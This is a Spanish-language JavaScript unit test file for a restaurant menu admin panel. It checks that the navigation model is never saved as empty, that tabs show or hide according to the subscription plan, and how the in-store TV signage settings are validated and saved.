describe('navElegido · guardar Apariencia no puede dejar sin modelo', () => {
	// Un <select> al que se le asigna un valor que no está entre sus opciones
	// se queda con "". Y "" en nav lo lee loader.js como falso y cae a topnav:
	// una carta en video se convertía en carta de fotos al pulsar Guardar.
	const elegir = (valorDelSelect, navGuardado) => {
		const ctx = cargar('index.html', 'function navElegido', '// Aplica las restricciones', {
			state: { restaurante: { atributos: navGuardado === undefined ? {} : { nav: navGuardado } } },
			document: { getElementById: () => ({ value: valorDelSelect }) },
		});
		return ctx.navElegido();
	};

	test('se guarda lo que elige el usuario', () => {
		assert.equal(elegir('sidebar', 'topnav'), 'sidebar');
		assert.equal(elegir('video', 'topnav'), 'video');
	});

	test('un desplegable sin la opción no borra el modelo', () => {
		// El caso exacto que rompió Voro.
		assert.equal(elegir('', 'video'), 'video');
	});

	test('sin nada de dónde tirar, topnav', () => {
		// topnav es el modelo por defecto del menú público: es la respuesta
		// segura, no una elección.
		assert.equal(elegir('', undefined), 'topnav');
	});

	test('nunca devuelve cadena vacía', () => {
		for (const [sel, guardado] of [['', ''], ['', null], ['', undefined], ['', 'carrito']])
			assert.notEqual(elegir(sel, guardado), '', `con ${JSON.stringify([sel, guardado])}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarPestanasAlModelo · donde hay carrito hay Pedidos', () => {
	// La pestaña Pedidos es donde se pone el WhatsApp al que llegan los
	// pedidos. Sin ella el cliente arma el suyo y no llega a ningún sitio,
	// sin ninguna pista de que falta configurar algo.
	const conAtributos = (atributos, plan = { carrito: true }) => {
		const mapa = {
			tabBtnToppings: { style: {} },
			tabBtnPedidos:  { style: {} },
			tabBtnTv:       { style: {} },
		};
		const ctx = cargar('index.html', [
			['// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
			['function ajustarPestanasAlModelo', '// Qué modelo se guarda'],
		], {
				MODELO_POR_DEFECTO: 'topnav',
				state: { restaurante: { atributos } },
				planActual: () => plan,
				document: { getElementById: id => mapa[id] },
				renderPedidos() {}, renderMetodosPago() {}, marcarBordesDeTabs() {},
			});
		ctx.ajustarPestanasAlModelo();
		return {
			pedidos:  mapa.tabBtnPedidos.style.display,
			toppings: mapa.tabBtnToppings.style.display,
			tv:       mapa.tabBtnTv.style.display,
		};
	};

	test('el modelo carrito siempre las tiene', () => {
		assert.equal(conAtributos({ nav: 'carrito' }).pedidos, 'block');
	});

	test('el modelo video con el carrito encendido también', () => {
		// Es lo que faltaba: se encendía el carrito en video y no había dónde
		// poner el número.
		assert.equal(conAtributos({ nav: 'video', carrito: true }).pedidos, 'block');
	});

	test('el modelo video sin carrito no las enseña', () => {
		assert.equal(conAtributos({ nav: 'video', carrito: false }).pedidos, 'none');
	});

	test('sin el plan no se enseñan aunque el interruptor esté puesto', () => {
		// El interruptor puede quedar encendido de un plan anterior. Manda el
		// plan de hoy, igual que en la carta.
		assert.equal(conAtributos({ nav: 'video', carrito: true }, { carrito: false }).pedidos, 'none');
	});

	test('la pestaña de TV solo sale con el plan que la incluye', () => {
		// La cartelera es de pago. Esconder la pestaña no es la protección
		// —el servidor filtra la clave 'tv' por plan— pero enseñarla a quien
		// no la tiene contratada es ofrecerle algo que no va a poder guardar.
		assert.equal(conAtributos({}, { carrito: true, tv: false }).tv, 'none');
		assert.equal(conAtributos({}, { carrito: true, tv: true }).tv, 'block');
	});

	test('si ya está configurada, la pestaña sigue saliendo sin el plan', () => {
		// Un cambio de plan no puede dejar una pantalla encendida en la pared
		// de un local sin ninguna forma de apagarla desde el panel.
		assert.equal(conAtributos({ tv: { activa: true } }, { carrito: true, tv: false }).tv, 'block');
	});

	test('topnav, sidebar y explorar no tienen Pedidos aunque el interruptor esté puesto', () => {
		// PE3. Sus cartas no llaman a activarCarrito(): la pestaña servía para
		// configurar un WhatsApp al que nunca iba a llegar un pedido.
		for (const nav of ['topnav', 'sidebar', 'explorar', undefined]) {
			const r = conAtributos({ nav, carrito: true });
			assert.equal(r.pedidos, 'none', `${nav ?? 'sin modelo'} enseña Pedidos`);
			assert.equal(r.toppings, 'none', `${nav ?? 'sin modelo'} enseña Toppings sin tener datos`);
		}
	});

	test('vertical con plan e interruptor sí las tiene, como indigo', () => {
		assert.equal(conAtributos({ nav: 'vertical', carrito: true }).pedidos, 'block');
	});

	test('el modelo carrito las tiene aunque el interruptor esté apagado, como perroscriollos', () => {
		assert.equal(conAtributos({ nav: 'carrito', carrito: false }, { carrito: false }).pedidos, 'block');
	});

	test('un restaurante con toppings de antes conserva su pestaña', () => {
		// Aunque ya no tenga carrito: son datos suyos y debe poder verlos.
		const r = conAtributos({ nav: 'topnav', salsas: ['BBQ'] }, { carrito: false });
		assert.equal(r.toppings, 'block');
		assert.equal(r.pedidos, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Pantalla TV · qué se guarda y qué se avisa', () => {
	// La cartelera vive en atributos.tv y la lee tv.html. Que esa clave exista
	// es lo único que la enciende, así que lo que se guarde aquí es lo que va a
	// estar puesto en la pared de un restaurante durante todo un servicio.
	// Un nodo que aguanta lo que hacen las tarjetas: innerHTML, querySelector,
	// replaceWith y appendChild. querySelector devuelve uno nuevo cada vez —no
	// hace falta que recuerde nada, porque lo que estas pruebas comprueban es
	// el ESTADO que se guarda, no el DOM que se pinta.
	const nodoDeMentira = () => ({
		style: {}, onclick: null, onchange: null, textContent: '', className: '',
		value: '', src: '', title: '', type: '',
		_html: '', firstChild: { style: {} }, lastChild: { style: {}, textContent: '' },
		set innerHTML(v) { this._html = v; },
		get innerHTML() { return this._html; },
		appendChild(h) { return h; },
		replaceWith() {},
		querySelector: () => nodoDeMentira(),
		addEventListener() {},
	});

	const montar = (opciones = {}) => {
		const campos = {
			tvActiva:      { checked: opciones.activa !== false },
			tvModo:        { value: opciones.modo || 'todos' },
			tvCategoria:   { value: opciones.categoria || 'c1', innerHTML: '', appendChild() {} },
			tvPorSlide:    { value: String(opciones.porSlide || 2) },
			tvSegundos:    { value: String(opciones.segundos ?? 8) },
			tvOrientacion: { value: opciones.orientacion || 'horizontal' },
			tvAleatorio:   { checked: !!opciones.aleatorio },
			tvAnimacion:   { checked: opciones.animacion !== false },
			tvMostrarCategoria: { checked: !!opciones.mostrarCategoria },
			tvColorCategoria: { value: 'sin pintar' },
			tvColorCategoriaFila: { style: {} },
			tvMuestraCategoria: { style: {} },
			tvAvisoColorCategoria: { textContent: '' },
			tvTema: { value: 'sin pintar' },
			tvRespetarHorarios: { checked: opciones.respetarHorarios !== false },
			tvProgramaciones: { innerHTML: '', appendChild() {} },
			tvProgVacio: { style: {} },
			tvImagenes: { innerHTML: '', appendChild() {} },
			tvImagenesEstado: { textContent: '', style: {} },
			tvNotaHorarios: { innerHTML: '', style: {} },
			tvTemaAyuda: { textContent: '' },
			tvIntercalaPromo: { checked: !!opciones.promoEnTv },
			tvIntercalaMarca: { checked: !!opciones.marca },
			tvMarcaOpciones: { style: {} },
			tvMarcaLogo: { checked: !!(opciones.marca && opciones.marca.logo) },
			tvMarcaFrase: { value: (opciones.marca && opciones.marca.frase) || '' },
			tvMarcaAyuda: { textContent: '', style: {} },
			tvOrdenFila: { style: {} },
			tvOrdenIntercalados: { value: (opciones.primero || 'promocion') },
			tvCada: { value: String(opciones.cada || 4) },
			tvCadaFila: { style: {} },
			tvSecuencia: { textContent: '' },
			tvPromoAyuda: { textContent: '', style: {} },
			tvMarcarTodos: { innerHTML: '', appendChild() {} },
			tvResumen:     { textContent: '', style: {} },
			tvAvisoTamano: { textContent: '', style: {} },
			tvStatus:      { textContent: '', style: {} },
			tvCategoriaWrap: { style: {} }, tvManualWrap: { style: {} },
			tvCuerpo: { style: {} }, tvAjustes: { style: {} },
			tvPlatos: { innerHTML: '', appendChild() {} },
			tvFiltroCat: { innerHTML: '', appendChild() {} },
			tvSeleccionados: { textContent: '' },
			tvEnlace: { value: '' },
		};
		const enviado = [];
		const avisos = [];
		const ctx = cargar('index.html', [
			// La regla del horario vive antes en el archivo: las excepciones de la
			// cartelera la usan para saber si una entrada dice algo.
			['const DIAS_CORTOS', 'let catDiasSel'],
			['function zonaRestaurante', 'function describirHorario'],
			['function describirHorario', 'function renderCatDiasChips'],
			// DIAS_PROMO vive con las tarjetas de promoción y lo reusan las de la
			// cartelera: los días de la semana se leen igual en los dos sitios.
			// Hasta renderPromociones: programacionDe la usan también las
			// miniaturas de imágenes sueltas de la pestaña del televisor.
			['promocion.js', 'const DIAS_PROMO', 'async function renderPromociones'],
			['tv.js', 'const TV_POR_DEFECTO', null],
		], {
			state: {
				promociones: opciones.promociones || [],
				restaurante: Object.assign(
				{ id: 'r1', slug: 'bonzas', color_primario: opciones.colorPrimario,
				  atributos: { tv: opciones.guardado || {} } },
				opciones.promo || {}),
				categorias: [{ id: 'c1', nombre: 'Hamburguesas' }, { id: 'c2', nombre: 'Bebidas' }],
				productos: opciones.productos || [
					{ id: 'p1', nombre: 'Burger', disponible: true,  imagen_url: 'https://x/1.jpg', categoria_id: 'c1' },
					{ id: 'p2', nombre: 'Perro',  disponible: true,  imagen_url: 'https://x/2.jpg', categoria_id: 'c1' },
					{ id: 'p3', nombre: 'Agua',   disponible: true,  imagen_url: '',               categoria_id: 'c2' },
					{ id: 'p4', nombre: 'Agotado',disponible: false, imagen_url: 'https://x/4.jpg', categoria_id: 'c1' },
				],
			},
			// El selector de platos escribe innerHTML y luego toca firstChild y
			// lastChild para poner la foto y el nombre. Un elemento de mentira
			// sin hijos revienta ahí, así que se los damos.
			document: {
				getElementById: id => campos[id],
				createElement: () => nodoDeMentira(),
			},
			urlPublica: () => 'https://menu.vmenus.co/bonzas',
			apiFetch: async (m, r, cuerpo) => { enviado.push(cuerpo); return { id: 'r1', atributos: {} }; },
			showToast: (m, t) => avisos.push([t, m]),
			navigator: { clipboard: { writeText: async () => {} } },
			Math, parseInt, Array, String, JSON,
		});
		return { ctx, campos, enviado, avisos, tvSeleccion: opciones.seleccion || [] };
	};

	test('solo cuenta platos disponibles Y con foto', () => {
		// Sin foto no hay slide, así que ofrecerlos sería una trampa: el
		// restaurante los marca y luego no salen en la pantalla.
		const { ctx } = montar();
		assert.equal(ctx.tvPlatosPosibles().length, 2, 'de cuatro, dos sirven');
	});

	test('avisa cuando la selección no mostraría ningún plato', () => {
		// El caso "puse la tele y solo sale mi logo". Vale más decirlo al
		// guardar que dejar que lo descubra con los clientes delante.
		const { ctx, campos } = montar({ modo: 'categoria', categoria: 'c2' });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /no mostraría ningún plato/);
	});

	test('el resumen dice cuánto dura la vuelta completa', () => {
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, segundos: 30 });
		ctx.tvPintarResumen();
		// 2 platos, 1 por pantalla, 30 s => 1 minuto justo.
		assert.match(campos.tvResumen.textContent, /2 platos/);
		assert.match(campos.tvResumen.textContent, /1 min/);
	});

	test('un plato por pantalla avisa de la resolución de las fotos', () => {
		// Se guardan a 800 px: repartidas entre dos sobran, ocupando un
		// televisor entero se nota.
		const { ctx, campos } = montar({ porSlide: 1 });
		ctx.tvAvisoTamano();
		assert.equal(campos.tvAvisoTamano.style.display, 'block');
		assert.match(campos.tvAvisoTamano.textContent, /borrosa/);

		const b = montar({ porSlide: 3 });
		b.ctx.tvAvisoTamano();
		assert.equal(b.campos.tvAvisoTamano.style.display, 'none');
	});

	test('de atributos manda SOLO la clave tv', async () => {
		// atributos lo comparten ocho pantallas. Mandar el objeto entero desde
		// la copia que el panel cargó al entrar es el fallo de §9.10.
		//
		// Las columnas de la promoción sí viajan al lado, pero son columnas del
		// restaurante y no comparten nada: no pueden pisar a nadie.
		const { ctx, enviado } = montar();
		await ctx.saveTV();
		assert.deepEqual(Object.keys(enviado[0].atributos), ['tv']);
		assert.deepEqual(Object.keys(enviado[0]).sort(), ['atributos', 'promo_en_tv']);
	});

	test('no deja encender una cartelera que no enseñaría nada', async () => {
		const { ctx, enviado, avisos, campos } = montar({ modo: 'categoria', categoria: 'c2' });
		await ctx.saveTV();
		assert.equal(enviado.length, 0, 'no se guarda');
		assert.equal(avisos[0][0], 'error');
		assert.match(campos.tvStatus.textContent, /Revisa/);
	});

	test('apagada sí se puede guardar aunque no haya platos', async () => {
		// Apagarla es justo lo que hace falta poder hacer cuando algo va mal.
		const { ctx, enviado } = montar({ activa: false, modo: 'categoria', categoria: 'c2' });
		await ctx.saveTV();
		assert.equal(enviado.length, 1);
		assert.equal(enviado[0].atributos.tv.activa, false);
	});

	test('los segundos se acotan antes de guardar, no en la pantalla', async () => {
		// Con 1 segundo la pantalla parpadea. tv.html también lo acota, pero
		// guardar un valor imposible deja al restaurante viendo un número que
		// no es el que se aplica.
		const { ctx, enviado } = montar({ segundos: 1 });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.segundos, 4);

		const b = montar({ segundos: 9999 });
		await b.ctx.saveTV();
		assert.equal(b.enviado[0].atributos.tv.segundos, 60);
	});

	test('el filtro por categoría no pierde lo marcado en otras', async () => {
		// El susto obvio al pulsar un chip: que al cambiar de categoría se
		// borre lo que ya se eligió en la anterior. El filtro toca lo que se
		// VE, no lo que está marcado.
		//
		// Se llega por el camino real —lo guardado— porque 'tvSeleccion' se
		// declara con let y eso no queda expuesto fuera del guion.
		const { ctx, enviado } = montar({ modo: 'manual', guardado: { modo: 'manual', productos: ['p1'] } });
		ctx.renderTV();
		ctx.tvPintarPlatos();      // con el filtro en 'Todas'
		await ctx.saveTV();
		assert.deepEqual([...enviado[0].atributos.tv.productos], ['p1'], 'sigue marcado');
	});

	test('el pie dice cuántos hay marcados en total', () => {
		// Filtrando es fácil perder de vista los elegidos fuera de la vista.
		const { ctx, campos } = montar({ modo: 'manual', guardado: { modo: 'manual', productos: ['p1', 'p2'] } });
		ctx.renderTV();
		ctx.tvPintarPlatos();
		assert.match(campos.tvSeleccionados.textContent, /2 platos marcados/);
	});

	test('con una sola categoría no se pintan chips', () => {
		// Un filtro que no filtra nada estorba más de lo que ayuda.
		const { ctx, campos } = montar({
			productos: [
				{ id: 'p1', nombre: 'A', disponible: true, imagen_url: 'https://x/1.jpg', categoria_id: 'c1' },
				{ id: 'p2', nombre: 'B', disponible: true, imagen_url: 'https://x/2.jpg', categoria_id: 'c1' },
			],
		});
		ctx.renderTV();
		campos.tvFiltroCat.innerHTML = 'algo';
		ctx.tvPintarFiltroCat();
		assert.equal(campos.tvFiltroCat.innerHTML, '', 'se vacía y no se pinta nada');
	});

	test('la animación se puede apagar y se guarda como tal', async () => {
		// Los televisores viejos tienen poca capacidad de dibujo. Si va a
		// tirones, el restaurante tiene que poder apagarla sin llamar a nadie.
		const { ctx, enviado } = montar({ animacion: false });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.animacion, 'ninguna');

		const b = montar();
		await b.ctx.saveTV();
		assert.equal(b.enviado[0].atributos.tv.animacion, 'suave', 'encendida por defecto');
	});

	test('avisa cuando hay menos platos que huecos en la pantalla', () => {
		// No es un fallo —salen más grandes y llenan igual, comprobado en el
		// navegador— pero elegir "4 a la vez" y ver dos descoloca sin aviso.
		const { ctx, campos } = montar({ modo: 'categoria', categoria: 'c1', porSlide: 4 });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /Solo hay 2/);
		assert.match(campos.tvResumen.textContent, /más grandes/);
	});

	test('sugiere el orden aleatorio cuando el ciclo es muy corto', () => {
		// Con una o dos pantallas el bucle se nota mucho. Barajar no añade
		// platos, pero cambia las parejas en cada vuelta y lo disimula.
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1 });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /orden aleatorio/);
	});

	test('no lo sugiere si ya está encendido', () => {
		// Sugerir algo que ya está puesto hace dudar de si de verdad lo está.
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, aleatorio: true });
		ctx.tvPintarResumen();
		assert.ok(!campos.tvResumen.textContent.includes('aleatorio'));
	});

	test('el resumen dice cuántas pantallas son', () => {
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, segundos: 10 });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /2 pantallas/);
	});

	test('el nombre de la categoría llega apagado a quien nunca lo tocó', () => {
		// Es opcional a propósito: para el restaurante cuyos platos ya se
		// entienden solos, una etiqueta más es ruido sobre la foto.
		//
		// Se comprueba por renderTV y no leyendo la constante: se declara con
		// const y eso no queda expuesto fuera del guion.
		const { ctx, campos } = montar({ mostrarCategoria: true, guardado: {} });
		ctx.renderTV();
		assert.equal(campos.tvMostrarCategoria.checked, false, 'sin nada guardado, apagado');
	});

	test('y encendido si así se guardó', () => {
		const { ctx, campos } = montar({ guardado: { mostrar_categoria: true } });
		ctx.renderTV();
		assert.equal(campos.tvMostrarCategoria.checked, true);
	});

	test('mostrar la categoría se guarda cuando se enciende', async () => {
		const { ctx, enviado } = montar({ mostrarCategoria: true });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.mostrar_categoria, true);
	});

	test('el color de la etiqueta se guarda', async () => {
		const { ctx, campos, enviado } = montar({ mostrarCategoria: true });
		campos.tvColorCategoria.value = 'marca';
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.color_categoria, 'marca');
	});

	test('sin nada guardado, el color llega en oscuro', () => {
		// El oscuro es el único que se lee encima de cualquier foto. Es el que
		// tiene que salirle a quien nunca abra este selector.
		const { ctx, campos } = montar({});
		ctx.renderTV();
		assert.equal(campos.tvColorCategoria.value, 'oscuro');
	});

	test('un color desconocido no deja el selector en blanco', () => {
		// Puede llegar de una versión anterior o de un retoque a mano en la
		// base. Un <select> con un valor que no existe se queda vacío, y al
		// guardar mandaría cadena vacía.
		const { ctx, campos } = montar({ guardado: { color_categoria: 'fucsia' } });
		ctx.renderTV();
		assert.equal(campos.tvColorCategoria.value, 'oscuro');
	});

	test('el selector de color solo aparece si la etiqueta está encendida', () => {
		const apagada = montar({ guardado: { mostrar_categoria: false } });
		apagada.ctx.renderTV();
		assert.equal(apagada.campos.tvColorCategoriaFila.style.display, 'none');

		const encendida = montar({ guardado: { mostrar_categoria: true } });
		encendida.ctx.renderTV();
		assert.equal(encendida.campos.tvColorCategoriaFila.style.display, 'block');
	});

	test('la muestra enseña el color de la carta, con su contraste', () => {
		const { ctx, campos } = montar({ mostrarCategoria: true, colorPrimario: '#0a4380' });
		campos.tvColorCategoria.value = 'marca';
		ctx.tvPintarMuestraCategoria();
		assert.equal(campos.tvMuestraCategoria.style.background, 'rgba(10, 67, 128, 0.9)');
		// Azul marino: encima va texto blanco. Con amarillo iría negro, y por
		// eso no se puede fijar ninguno de los dos.
		assert.equal(campos.tvMuestraCategoria.style.color, '#ffffff');
		assert.equal(campos.tvAvisoColorCategoria.textContent, '');
	});

	test('sobre amarillo el texto se pone negro', () => {
		const { ctx, campos } = montar({ mostrarCategoria: true, colorPrimario: '#ffd521' });
		campos.tvColorCategoria.value = 'marca';
		ctx.tvPintarMuestraCategoria();
		assert.equal(campos.tvMuestraCategoria.style.color, '#14131c');
	});

	test('sin color guardado se avisa en vez de enseñar un color falso', () => {
		// Tres restaurantes tienen la columna vacía. La cartelera vuelve al
		// oscuro; enseñar aquí una muestra bonita sería mentir sobre lo que va
		// a salir en la pared.
		const { ctx, campos } = montar({ mostrarCategoria: true, colorPrimario: null });
		campos.tvColorCategoria.value = 'marca';
		ctx.tvPintarMuestraCategoria();
		assert.equal(campos.tvMuestraCategoria.style.background, 'rgba(10, 10, 15, 0.62)');
		assert.match(campos.tvAvisoColorCategoria.textContent, /Apariencia/);
	});

	test('el tema de la página se guarda y se relee', async () => {
		const { ctx, campos, enviado } = montar({ guardado: { tema: 'carta' } });
		ctx.renderTV();
		assert.equal(campos.tvTema.value, 'carta');
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.tema, 'carta');
	});

	test('sin tema guardado, neutro', () => {
		// Nadie que no lo pida debe ver su cartelera cambiar de aspecto.
		const { ctx, campos } = montar({});
		ctx.renderTV();
		assert.equal(campos.tvTema.value, 'oscuro');
	});

	// ── PLATOS SUELTOS Y MEZCLA EN LAS EXCEPCIONES ────────────
	test('una excepción de platos sueltos guarda su lista', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'manual',
		                 productos: ['p1', 'p2'], categoria_id: 'c1' }];
		const g = ctx.tvProgramacionesParaGuardar(lista)[0];
		assert.equal(g.modo, 'manual');
		assert.equal(g.productos.join(' '), 'p1 p2');
		// La categoría no pinta nada en modo manual: guardarla dejaría un dato
		// que nadie lee y que confunde al mirar la fila.
		assert.equal(g.categoria_id, null);
	});

	test('una de categoría no arrastra una lista de platos', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'categoria',
		                 categoria_id: 'c1', productos: ['p1'] }];
		const g = ctx.tvProgramacionesParaGuardar(lista)[0];
		assert.equal(g.categoria_id, 'c1');
		assert.equal(g.productos.length, 0);
	});

	test('la mezcla se guarda como booleano, no como lo que venga', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'todos', mezclar: 'sí' }];
		assert.equal(ctx.tvProgramacionesParaGuardar(lista)[0].mezclar, true);
	});

	test('sin mezclar declarado, se guarda apagada', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'todos' }];
		assert.equal(ctx.tvProgramacionesParaGuardar(lista)[0].mezclar, false);
	});

	// ── LAS IMÁGENES SUELTAS DE LA PANTALLA ───────────────────
	// Son promociones con 'en_tv'. Lo que faltaba no era el dato: era poder
	// verlas y crearlas desde la pestaña donde se buscan.
	test('solo se listan las marcadas para el televisor', () => {
		const { ctx, campos } = montar({ promociones: [
			{ id: 'a', en_tv: true,  activa: true, imagen_url: 'https://x/a.jpg', programacion: {} },
			{ id: 'b', en_tv: false, activa: true, imagen_url: 'https://x/b.jpg', programacion: {} },
		] });
		let pintadas = 0;
		campos.tvImagenes.appendChild = () => { pintadas++; };
		ctx.tvPintarImagenes();
		assert.equal(pintadas, 1);
	});

	test('sin ninguna se dice, en vez de dejar el hueco vacío', () => {
		const { ctx, campos } = montar({ promociones: [] });
		let texto = '';
		campos.tvImagenes.appendChild = n => { texto = n.textContent; };
		ctx.tvPintarImagenes();
		assert.match(texto, /Ninguna/);
	});

	// ── EXCEPCIONES CON HORARIO ───────────────────────────────
	// A las siete desayunos, a las doce almuerzos, los martes lo que sea. Manda
	// la PRIMERA vigente, así que el orden importa y hay que poder cambiarlo.
	const CON_HORARIO = { activo: true, dias: [2], desde: '', hasta: '',
	                      desde_fecha: '', hasta_fecha: '' };
	const SIN_NADA    = { activo: true, dias: [], desde: '', hasta: '',
	                      desde_fecha: '', hasta_fecha: '' };

	test('lo guardado se relee', () => {
		const { ctx } = montar({ guardado: { programaciones: [
			{ programacion: CON_HORARIO, modo: 'categoria', categoria_id: 'c1' }] } });
		ctx.renderTV();
		assert.equal(ctx.tvProgramacionesParaGuardar().length, 1);
		assert.equal(ctx.tvProgramacionesParaGuardar()[0].categoria_id, 'c1');
	});

	test('y se guarda dentro de atributos.tv', async () => {
		const { ctx, enviado } = montar({ guardado: { programaciones: [
			{ programacion: CON_HORARIO, modo: 'categoria', categoria_id: 'c1' }] } });
		ctx.renderTV();
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.programaciones.length, 1);
		assert.equal(enviado[0].atributos.tv.programaciones[0].modo, 'categoria');
	});

	test('una excepción sin días, horas ni fechas no se guarda', () => {
		// Sería vigente siempre y taparía la selección base para siempre, sin que
		// se note que fue ella. tv.html se la salta; aquí ni se guarda.
		const { ctx } = montar();
		const lista = [{ programacion: SIN_NADA, modo: 'todos' },
		               { programacion: CON_HORARIO, modo: 'categoria', categoria_id: 'c1' }];
		const guardadas = ctx.tvProgramacionesParaGuardar(lista);
		assert.equal(guardadas.length, 1);
		assert.equal(guardadas[0].categoria_id, 'c1');
	});

	test('sin excepciones se guarda una lista vacía, no falta la clave', () => {
		// Si faltara, tv.html caería en su valor por defecto y no habría forma de
		// borrar la última excepción.
		const { ctx, enviado } = montar();
		return ctx.saveTV().then(() => {
			// Con longitud y no con deepEqual: el array nace dentro del vm y una
			// comparación profunda entre realms falla aunque el contenido coincida.
			assert.equal(enviado[0].atributos.tv.programaciones.length, 0);
		});
	});

	test('moverlas cambia el orden, que es lo que decide cuál manda', () => {
		const { ctx } = montar();
		const lista = [{ id: 'a' }, { id: 'b' }, { id: 'c' }];
		ctx.tvMoverProgramacion(2, -1, lista);
		assert.equal(lista.map(x => x.id).join(''), 'acb');
	});

	test('no se puede mover más allá de los extremos', () => {
		const { ctx } = montar();
		const lista = [{ id: 'a' }, { id: 'b' }];
		ctx.tvMoverProgramacion(0, -1, lista);
		ctx.tvMoverProgramacion(1, 1, lista);
		assert.equal(lista.map(x => x.id).join(''), 'ab');
	});

	// ── LOS HORARIOS DE CATEGORÍA, OPCIONALES ─────────────────
	// El televisor y la carta no siempre quieren lo mismo: una categoría de
	// desayunos escondida a las once tiene sentido en el QR y ninguno en una
	// pantalla que enseña lo que el negocio sabe hacer.
	test('por defecto se respetan, aunque no esté guardado', async () => {
		// Una cartelera que lleva meses funcionando no tiene esta clave, y no
		// puede notar que apareció.
		const { ctx, campos, enviado } = montar();
		ctx.renderTV();
		assert.equal(campos.tvRespetarHorarios.checked, true);
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.respetar_horarios, true);
	});

	test('lo guardado se relee, también cuando está apagado', () => {
		const { ctx, campos } = montar({ guardado: { respetar_horarios: false } });
		ctx.renderTV();
		assert.equal(campos.tvRespetarHorarios.checked, false);
	});

	test('apagado se guarda apagado', async () => {
		const { ctx, campos, enviado } = montar({ respetarHorarios: false });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.respetar_horarios, false);
	});

	test('la nota dice lo que pasa en los dos sentidos', () => {
		// Encendido no es "nada": es una regla actuando, configurada en OTRA
		// pestaña, que es justo lo que nadie descubre solo.
		const on = montar();
		on.ctx.tvPintarNotaHorarios();
		assert.match(on.campos.tvNotaHorarios.innerHTML, /desaparecen de la cartelera/);
		assert.match(on.campos.tvNotaHorarios.innerHTML, /Categorías/);

		const off = montar({ respetarHorarios: false });
		off.ctx.tvPintarNotaHorarios();
		assert.match(off.campos.tvNotaHorarios.innerHTML, /todos<\/strong> los platos/);
		// Y que quede claro que no toca la carta del comensal.
		assert.match(off.campos.tvNotaHorarios.innerHTML, /solo cambia el televisor/);
	});

	test('la lista se guarda en atributos.tv, no como columnas sueltas', async () => {
		// El ritmo y qué se intercala son del TELEVISOR. 'promo_en_tv' sigue
		// siendo columna porque es una propiedad de la promoción, y se deriva de
		// la lista para que no puedan discrepar.
		const { ctx, campos, enviado } = montar({ promoEnTv: true });
		campos.tvCada.value = '3';
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'promocion' }]));
		assert.equal(enviado[0].atributos.tv.cada, 3);
		assert.equal(enviado[0].promo_en_tv, true);
		// El ritmo dejó de ser de la promoción: ya no se escribe esa columna.
		assert.equal('promo_cada' in enviado[0], false);
	});

	test('la marca se guarda con su logo y su frase', async () => {
		const { ctx, enviado } = montar({ marca: { logo: true, frase: 'Desde 1998' } });
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'marca', logo: true, frase: 'Desde 1998' }]));
		assert.equal(enviado[0].promo_en_tv, false);
	});

	test('el orden elegido es el orden guardado', async () => {
		const { ctx, enviado } = montar({
			promoEnTv: true, marca: { logo: true, frase: '' }, primero: 'marca',
		});
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.intercalados.map(i => i.tipo).join(' '),
			'marca promocion');
	});

	test('una marca sin logo y sin frase no deja guardar', async () => {
		// Antes esto SÍ se guardaba: la entrada se descartaba en silencio, el
		// interruptor se quedaba encendido y en el televisor no salía nada. Quien
		// lo miraba no tenía forma de saber por qué, y el interruptor encendido
		// decía justo lo contrario de lo que pasaba. Mismo patrón que la
		// cartelera encendida sin platos, que ya se rechazaba.
		const { ctx, campos, enviado } = montar({ promoEnTv: true, marca: { logo: false, frase: '  ' } });
		await ctx.saveTV();
		assert.equal(enviado.length, 0, 'no se manda nada');
		assert.match(campos.tvStatus.textContent, /Incluye tu logo o escribe una frase/);
	});

	test('pero con solo la frase sí', async () => {
		// Quitar el logo y dejar la frase es una configuración legítima, y la
		// cartelera la pinta: la frase sola, más grande.
		const { ctx, enviado } = montar({ marca: { logo: false, frase: 'SABOR AL GUSTO' } });
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'marca', logo: false, frase: 'SABOR AL GUSTO' }]));
	});

	test('y con solo el logo también', async () => {
		const { ctx, enviado } = montar({ marca: { logo: true, frase: '' } });
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'marca', logo: true, frase: '' }]));
	});

	test('lo guardado se relee en las casillas', () => {
		const { ctx, campos } = montar({
			guardado: { cada: 6, intercalados: [
				{ tipo: 'marca', logo: true, frase: 'Hola' }, { tipo: 'promocion' }] },
		});
		ctx.renderTV();
		assert.equal(campos.tvIntercalaPromo.checked, true);
		assert.equal(campos.tvIntercalaMarca.checked, true);
		assert.equal(campos.tvMarcaLogo.checked, true);
		assert.equal(campos.tvMarcaFrase.value, 'Hola');
		assert.equal(campos.tvOrdenIntercalados.value, 'marca');
		assert.equal(campos.tvCada.value, '6');
	});

